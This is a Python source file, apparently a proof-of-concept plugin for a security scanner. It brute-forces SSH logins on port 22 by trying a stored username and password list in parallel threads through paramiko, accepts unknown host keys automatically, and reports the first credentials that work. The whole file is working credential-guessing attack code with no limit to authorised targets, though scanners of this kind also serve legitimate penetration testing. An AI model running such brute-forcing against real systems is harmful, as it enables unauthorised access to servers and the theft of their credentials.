# -*- coding:utf-8 -*-
# ssh弱密码
import paramiko

from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan
import threading


class Burp(threading.Thread):
    def __init__(self, ip, username, password):
        threading.Thread.__init__(self)
        self.ip = ip
        self.username = username
        self.password = password
        self.result = False

    def run(self):
        try:
            ssh = paramiko.SSHClient()  # 创建SSH对象
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 允许连接不在know_hosts文件中的主机
            ssh.connect(hostname=self.ip, port=22, username=self.username, password=self.password, timeout=0.5)  # 连接服务器
            self.result = True
        except:
            return False

    def get_result(self):
        return self.result

def test(burp_list):
    for i in burp_list:
        i.start()
    for i in burp_list:
        i.join()
    for i in burp_list:
        result = i.get_result()
        if result:
            return (
                ["ssh弱密码", "用户名: %s<br>密码: %s" % (i.username, i.password)], "%s:%s" % (i.username, i.password))
    return False

def fingerprint(service):
    try:
        if service.port == 22:
            return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        info_list = fileUtil.get_burp_list("ssh")
        burp_list = []
        for i in info_list:
            burp_list.append(Burp(service.ip, *(i)))
            if len(burp_list) % 10 == 0:
                result = test(burp_list)
                if result:
                    return result
                burp_list = []
        result = test(burp_list)
        if result:
            return result
    except Exception as e:
        print(e)
        return []
